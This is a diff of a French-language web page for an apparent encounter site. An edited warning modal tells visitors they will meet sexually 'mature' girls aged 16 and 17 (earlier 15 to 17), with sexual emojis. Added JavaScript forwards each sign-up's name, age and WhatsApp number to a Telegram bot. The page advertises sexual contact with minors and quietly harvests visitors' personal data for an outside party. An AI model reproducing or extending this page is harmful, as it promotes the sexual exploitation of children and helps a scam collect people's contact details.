@@ -450,7 +450,7 @@ header {
         <div class="modal-content">
             <h3>🛡️ Attention !!!</h3>
             <p> 
-                La particularité de ce site est que vous rencontrerez également des gonzesses de 15 à 17 ans mais mûr et mature 🫦👅💦. Si celà vous dérange il n'est pas trop tard pour faire marche arrière.
+                La particularité de ce site est que vous rencontrerez également des gonzesses de 16 et 17 ans mais mûr et mature 🫦👅💦. Si celà vous dérange il n'est pas trop tard pour faire marche arrière.
                 ‎
                 Afin d'assurer un environnement de qualité nous informons nos utilisateurs de ce qu'ils vont rencontrer sur le site pour ne pas les decevoir.
                 <br><br>
@@ -659,3 +659,38 @@ function sendToTelegramBot(name, age, whatsapp) {
     const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
     console.log("Tentative d'envoi des données d'inscription à Telegram...");
+
+    // Retourne la Promesse qui résout à true ou false selon le succès
+    return fetch(url)
+         .then(response => {
+             if (response.ok) {
+                 console.log("Données envoyées avec succès à Telegram.");
+                 return true; // Succès
+             } else {
+                 console.error(`Échec de l'envoi à Telegram. Statut: ${response.status}`);
+                 response.json().then(data => console.error("Détails de l'erreur Telegram:", data));
+                 return false; // Échec API Telegram
+             }
+         })
+         .catch(error => {
+             console.error("Erreur réseau ou CORS lors de l'envoi à Telegram:", error);
+             return false; // Échec réseau
+         });
+}
+
+// Ferme les Modals si l'utilisateur clique en dehors des boîtes
+window.onclick = function(event) {
+    if (event.target == modal1) {
+        closeModal(modal1);
+    }
+    if (event.target == modal2) {
+        closeModal(modal2);
+    }
+    if (event.target == modal3) {
+        closeModal(modal3);
+    }
+}
+
+    </script>
+</body>
+</html>
